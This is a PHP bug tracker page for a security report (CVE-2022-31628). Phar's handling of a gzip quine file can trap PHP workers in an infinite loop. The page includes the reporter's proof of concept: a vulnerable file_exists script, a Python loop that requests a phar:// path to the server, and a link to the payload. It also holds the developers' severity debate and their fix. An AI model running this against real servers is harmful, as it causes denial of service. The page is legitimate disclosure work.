<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='PHAR related Bug #81726 - RDF' href='rss/bug.php?id=81726'>
        <link rel='alternate' type='application/rss+xml' title='PHAR related Bug #81726 - RSS 2.0' href='rss/bug.php?id=81726&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #81726 :: phar wrapper can occur dos when using quine gzip file</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=81726">Sec Bug</a>&nbsp;#81726</th>
            <td id="summary" colspan="5">phar wrapper can occur dos when using quine gzip file</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2022-07-19 14:30 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2022-09-29 18:58 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=PHAR+related">PHAR related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>7.4.30</td>
            <th class="details">OS:</th>
            <td>ubuntu-20.04</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31628" target="_blank">2022-31628</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_1' class='control'><a href='bug.php?id=81726&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=81726&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1658241009">&nbsp;</a><strong>[2022-07-19 14:30 UTC] ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
follow below url
<a href="https://github.com/php/php-src/blob/2f5295692fde289f99aa9701528dcde4c78b780f/ext/phar/phar.c#L1623" rel="nofollow">https://github.com/php/php-src/blob/2f5295692fde289f99aa9701528dcde4c78b780f/ext/phar/phar.c#L1623</a>

in line 1652, php execute while statement until the file pointer returns eof.

while(!php_stream_eof(fp)) {
		if ((got = php_stream_read(fp, buffer+tokenlen, readsize)) &lt; (size_t) tokenlen) {
			MAPPHAR_ALLOC_FAIL(&quot;internal corruption of phar \&quot;%s\&quot; (truncated entry)&quot;)
		}

after entering the while statement, value of test variable is set to \1.
However, we can set value of test variable to \0 after passing if statements in line 1660, 1720.
<a href="https://github.com/php/php-src/blob/2f5295692fde289f99aa9701528dcde4c78b780f/ext/phar/phar.c#L1718" rel="nofollow">https://github.com/php/php-src/blob/2f5295692fde289f99aa9701528dcde4c78b780f/ext/phar/phar.c#L1718</a>
<a href="https://github.com/php/php-src/blob/2f5295692fde289f99aa9701528dcde4c78b780f/ext/phar/phar.c#L1756" rel="nofollow">https://github.com/php/php-src/blob/2f5295692fde289f99aa9701528dcde4c78b780f/ext/phar/phar.c#L1756</a>

If we can constantly set value of test variable to \0, then we can make php fall into an infinite loop.

Of course, we have to upload a gzip payload for the attack on the victim&#039;s server. However, this is not a problem because many php servers support upload.



Test script:
---------------
test_dos.php

&lt;?php
file_exists($_GET[&#039;file&#039;]);
?&gt;

exploit.py

import requests

SERVER = &quot;&quot;
while True:
    try:
        requests.get(SERVER+&quot;/test_dos.php?file=phar://2xq.gz&quot;,timeout=1)
    except:
        pass

2xq.gz

hxxp://ssrf.kr/2xq.gz

Expected result:
----------------
I don&#039;t know correct result of this.
Maybe, there is no problem with the implementation.
But no one would have expected that decompressing gzip file could make strange file that would return gzip file again.

Actual result:
--------------
An infinite loop occurs in all files with php extensions

</pre>
</div><h2>Patches</h2>
<h2>Pull Requests</h2>
<div>
Pull requests:<br>
<ul>
  <li><a href="https://github.com/php/web-doc/pull/18">Fix some grammatical errors on home page</a>
      (web-doc/18)</li>
  <li><a href="https://github.com/php/web-windows/pull/24">Prepare for longer commit hashes</a>
      (web-windows/24)</li>
  <li><a href="https://github.com/php/web-windows/pull/21">Ignore externally managed and generated files</a>
      (web-windows/21)</li>
</ul>
</div>
<h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1658241283">&nbsp;</a><strong>[2022-07-19 14:34 UTC] ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Reporter Credit: @real_as3617, @gPayl0ad
</pre>
</div><div class='comment type_comment' ><a name="1658311183">&nbsp;</a><strong>[2022-07-20 09:59 UTC] ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>file() filetime() filectime() fileatime() file_put_contents() fileinode() file_exists() filegroup() fileowner() file_get_contents() fopen() fileperms() is_dir() is_readable() is_executable() is_writable() is_writeable() is_file() is_link() parse_ini_file() copy() unlink() stat() readfile()

dos can occur in all functions where phar wrapper is available
</pre>
</div><div class='comment type_comment' ><a name="1658313151">&nbsp;</a><strong>[2022-07-20 10:32 UTC] ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Also, since the code of phar.c has rarely been updated, it is expected to work the same in latest version of php.
</pre>
</div><div class='comment type_log' ><a name="1658758177">&nbsp;</a><strong>[2022-07-25 14:09 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1658758177">&nbsp;</a><strong>[2022-07-25 14:09 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>Thank you for reporting this issue!

I was not aware of compressed file quines[1], but indeed, these
would cause an infinite loop with all relevant PHP versions.

Suggested patch: &lt;<a href="https://gist.github.com/cmb69/77ad17bf57c6ef35785476d5328b4b74" rel="nofollow">https://gist.github.com/cmb69/77ad17bf57c6ef35785476d5328b4b74</a>&gt;.

Stas, what do you think?

[1] &lt;<a href="https://honno.dev/gzip-quine/" rel="nofollow">https://honno.dev/gzip-quine/</a>&gt;
</pre>
</div><div class='comment type_comment' ><a name="1659329336">&nbsp;</a><strong>[2022-08-01 04:48 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<pre class='note'>phar are mostly code archive

So if you allow phar from untrusted sources, of course this may raise lot of issues.

IMHO this should be manage as (at most) &quot;low&quot; security
(and thus go thru next RC without a need for a CVE)
</pre>
</div><div class='comment type_comment' ><a name="1659332690">&nbsp;</a><strong>[2022-08-01 05:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>I&#039;m not sure what&#039;s going on here - why would phar try repeatedly to decompress the same archive? Isn&#039;t once enough?
</pre>
</div><div class='comment type_comment' ><a name="1659333345">&nbsp;</a><strong>[2022-08-01 05:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The code in example is obviously insecure (you can force it to work as open proxy, or do other nasty stuff with various wrappers) but if it has problems with phar:// on something as simple as file_exists, it still can be a problem, because inspecting phars doesn&#039;t seem to be an inherently insecure operation. I don&#039;t think it&#039;d execute the stub when inspecting it, or something like that?
</pre>
</div><div class='comment type_log' ><a name="1659333384">&nbsp;</a><strong>[2022-08-01 05:56 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To: stas</span>
<span class="added">+Assigned To: cmb</span>
</div></div></div><div class='comment type_comment' ><a name="1659345441">&nbsp;</a><strong>[2022-08-01 09:17 UTC] ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Of course, allowing phar wrapper can cause many security problems, but I don&#039;t think this bug has a low severity. The important thing about this bug is that all php workers fall infinite loop in just a few requests.
And that poc is the most extreme example.
The same bug occurs when using the poc of CVE-2020-7068.

----- ----- php.ini -----
+ + phar.cache_list =/path/2xq.gz
-------------------

<a href="https://bugs.php.net/bug.php?id=79797" rel="nofollow">https://bugs.php.net/bug.php?id=79797</a>
Of course, this bug was published with a cve.
</pre>
</div><div class='comment type_comment' ><a name="1659345716">&nbsp;</a><strong>[2022-08-01 09:21 UTC] ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>And, I agree with stats. just once is enough.
</pre>
</div><div class='comment type_comment' ><a name="1659346773">&nbsp;</a><strong>[2022-08-01 09:39 UTC] ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>oh sorry. not stats but stas
</pre>
</div><div class='comment type_log' ><a name="1659362207">&nbsp;</a><strong>[2022-08-01 13:56 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To: cmb</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1659362207">&nbsp;</a><strong>[2022-08-01 13:56 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>To clarify, this issue does not only affect the phar stream
wrapper, but also the PharData class, which is not supposed to
cause such issues, and is likely not rarely used to deal with .tgz
files.  A simple

    new PharData(__DIR__ . &quot;/quine.tgz&quot;);

causes an infinite loop.

&gt; Isn&#039;t once enough?

Maybe, but at least wrt. backwards compatibility I wouldn&#039;t
disallow multiple passes for now; after all, a gzip compressed
file might have been gzip compressed again (maybe accidentially),
and that is handled fine.
</pre>
</div><div class='comment type_comment' ><a name="1659366900">&nbsp;</a><strong>[2022-08-01 15:15 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>&gt; a gzip compressed file might have been gzip compressed again (maybe accidentially), and that is handled fine.

What do you mean here by &quot;handled fine&quot;? If you gzip a gzipped file again, then nobody I think expects that after you run &quot;gzip -d&quot; on it, it&#039;d try to decompress it infinitely until it gets to the &quot;original&quot; - the expectation would be it runs decompression once. I don&#039;t see why the expectation for phar should be any different.
</pre>
</div><div class='comment type_comment' ><a name="1659431507">&nbsp;</a><strong>[2022-08-02 09:11 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>&gt; the expectation would be it runs decompression once

Fair enough.  Still, for BC reasons we probably should not change
that in a stable version, at least not in PHP 7.4.
</pre>
</div><div class='comment type_comment' ><a name="1663823820">&nbsp;</a><strong>[2022-09-22 05:17 UTC] ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>any progress?
</pre>
</div><div class='comment type_comment' ><a name="1663934280">&nbsp;</a><strong>[2022-09-23 11:58 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>This issue is scheduled to be fixed with the next GA releases
(2022-09-29).  A slight variation of my suggested patch will be
used (with recursion_count = 3 instead of 100).
</pre>
</div><div class='comment type_comment' ><a name="1664165327">&nbsp;</a><strong>[2022-09-26 04:08 UTC] ohseungju5 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>can i get cve?
</pre>
</div><div class='comment type_log' ><a name="1664284098">&nbsp;</a><strong>[2022-09-27 13:08 UTC] <a href="//people.php.net/derick">derick@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2022-31628</span>
</div></div></div><div class='comment type_log' ><a name="1664286861">&nbsp;</a><strong>[2022-09-27 13:54 UTC] <a href="//people.php.net/derick">derick@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_comment' ><a name="1664286861">&nbsp;</a><strong>[2022-09-27 13:54 UTC] <a href="//people.php.net/derick">derick@php.net</a></strong>
<pre class='note'>Thank you for your bug report. This issue has already been fixed
in the latest released version of PHP, which you can download at
<a href="http://www.php.net/downloads.php" rel="nofollow">http://www.php.net/downloads.php</a>


</pre>
</div><div class='comment type_patch' ><a name="1706854493">&nbsp;</a><strong>[2024-02-02 06:14 UTC] chenyongjun &#x61;&#116; bufang &#x64;&#111;&#x74; com</strong>
<pre class='note'>The following pull request has been associated:

Patch Name: Fix some grammatical errors on home page
On GitHub:  <a href="https://github.com/php/web-doc/pull/18" rel="nofollow">https://github.com/php/web-doc/pull/18</a>
Patch:      <a href="https://github.com/php/web-doc/pull/18.patch" rel="nofollow">https://github.com/php/web-doc/pull/18.patch</a>
</pre>
</div><div class='comment type_patch' ><a name="1713853862">&nbsp;</a><strong>[2024-04-23 06:31 UTC] 156190772 &#x61;&#116; qq &#x64;&#111;&#x74; com</strong>
<pre class='note'>The following pull request has been associated:

Patch Name: Ignore externally managed and generated files
On GitHub:  <a href="https://github.com/php/web-windows/pull/21" rel="nofollow">https://github.com/php/web-windows/pull/21</a>
Patch:      <a href="https://github.com/php/web-windows/pull/21.patch" rel="nofollow">https://github.com/php/web-windows/pull/21.patch</a>
</pre>
</div><div class='comment type_patch' ><a name="1713853890">&nbsp;</a><strong>[2024-04-23 06:31 UTC] 156190772 &#x61;&#116; qq &#x64;&#111;&#x74; com</strong>
<pre class='note'>The following pull request has been associated:

Patch Name: Prepare for longer commit hashes
On GitHub:  <a href="https://github.com/php/web-windows/pull/24" rel="nofollow">https://github.com/php/web-windows/pull/24</a>
Patch:      <a href="https://github.com/php/web-windows/pull/24.patch" rel="nofollow">https://github.com/php/web-windows/pull/24.patch</a>
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2025 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Wed Jan 08 14:01:28 2025 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
